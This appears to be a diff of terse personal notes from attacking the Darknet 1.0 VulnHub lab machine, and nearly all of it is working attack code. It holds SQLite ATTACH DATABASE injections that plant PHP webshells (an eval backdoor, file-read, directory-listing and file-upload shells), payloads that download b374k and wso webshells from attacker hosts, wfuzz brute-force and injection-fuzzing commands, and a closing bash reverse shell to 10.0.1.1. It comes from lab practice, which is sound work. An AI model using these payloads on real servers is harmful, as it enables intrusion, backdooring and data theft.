@@ -1,3 +1,4 @@
+http://blog.ottos.network/2015/06/darknet-10-write-up.html
 
 https://www.vulnhub.com/entry/darknet-10,120/
 
@@ -5,6 +6,9 @@ https://www.vulnhub.com/entry/darknet-10,120/
 https://leonjza.github.io/blog/2016/06/16/rooting-darknet/#888-authentication-bypass
 
 
+https://github.com/tennc/webshell/tree/master/php/b374k
+
+https://github.com/tennc/webshell/tree/master/php/wso
 
 
 └─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.53
@@ -139,9 +143,41 @@ CREATE TABLE pwn.shell (code TEXT);
 INSERT INTO pwn.shell (code) VALUES ("<?php if($_GET['a'] == 'ls') { print_r(scandir($_GET['p'])); } if($_GET['a'] == 'cat') { print_r(readfile($_GET['p'])); } ?>");
 
 
+
+if ($_GET["cmd"] == "db") {
+    $dbhandler=new SQLite3("/home/devnull/database/888-darknet.db");
+
+    $query = $dbhandler->query("SELECT * FROM login");
+
+    while($result=$query->fetchArray()){
+        print_r($result);
+        print "<br/>";
+    }
+}
+
+if ($_GET["cmd"] == "ls") {
+    $path = $_GET["arg"];
+    @chdir($path);
+    $dir = @dir($path);
+    while($d = $dir->read()) {
+        print $d."<br/>";
+    }
+}
+if ($_GET["cmd"] == "cat") {
+    $file = $_GET["arg"];
+    $fh = fopen($file, "r");
+    if ($fh) {
+        while ($l = fgets($fh)) {
+            print htmlspecialchars($l)."<br/>";
+        }
+        fclose($fh);
+    } else { print "Cannot open ".$file."<br/>"; }
+}
+
+
 ATTACH DATABASE '/home/devnull/public_html/img/get.php' as pwn;
 CREATE TABLE pwn.shell (code TEXT);
-INSERT INTO pwn.shell (code) VALUES ("<?php $content = file_get_contents("http://192.168.110.1:8888/les.sh"); echo $content ?>");
+INSERT INTO pwn.shell (code) VALUES ("<?php $content = file_get_contents("http://192.168.110.1:8888/wso.sh"); echo $content ?>");
 
 
 attach database '/home/devnull/public_html/img/backdoor.php' as backdoor; create table backdoor.tbl (cmd TEXT); insert into backdoor.tbl (cmd) values ("<?php $_REQUEST[e] ? eval( $_REQUEST[e] ) : exit; ?>");
@@ -166,5 +202,16 @@ wfuzz -c -w /usr/share/wordlists/metasploit/unix_passwords.txt -d "username=admi
 
 └─$ wfuzz -c -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt  http://signal8.darknet.com/contact.php?id=FUZZ
 
-attach database '/home/devnull/public_html/img/rfi.php' as backdoor; create table backdoor.tbl (cmd TEXT); insert into backdoor.tbl (cmd) values ("<?php $content = file_get_contents("http://192.168.110.1:8888/wso/wso.php"); $myfile = fopen("/home/devnull/public_html/img/wso.php", "w") or die("Unable to open file!"); fwrite($myfile, $content);fclose($myfile); ?>");
+attach database '/home/devnull/public_html/img/rfi.php' as backdoor; create table backdoor.tbl (cmd TEXT); insert into backdoor.tbl (cmd) values ("<?php $content = file_get_contents("http://10.0.1.1:8000/b374k.php"); ?>");
 
+$myfile = fopen("/home/devnull/public_html/img/b374k.php", "w");fwrite(file_get_contents("http://10.0.1.1:8000/b374k.php"));
+
+
+
+ATTACH DATABASE '/home/devnull/public_html/img/upload.php' as pwn;
+CREATE TABLE pwn.shell (code TEXT);
+INSERT INTO pwn.shell (code) VALUES ("<?php error_reporting(E_ALL); ini_set('display_errors', 1); $fp = fopen($_POST['name'], 'wb'); fwrite($fp, base64_decode($_POST['content'])); fclose($fp); ?>");
+
+
+
+/bin/bash -i > /dev/tcp/10.0.1.1/1234 0<&1 2>&1
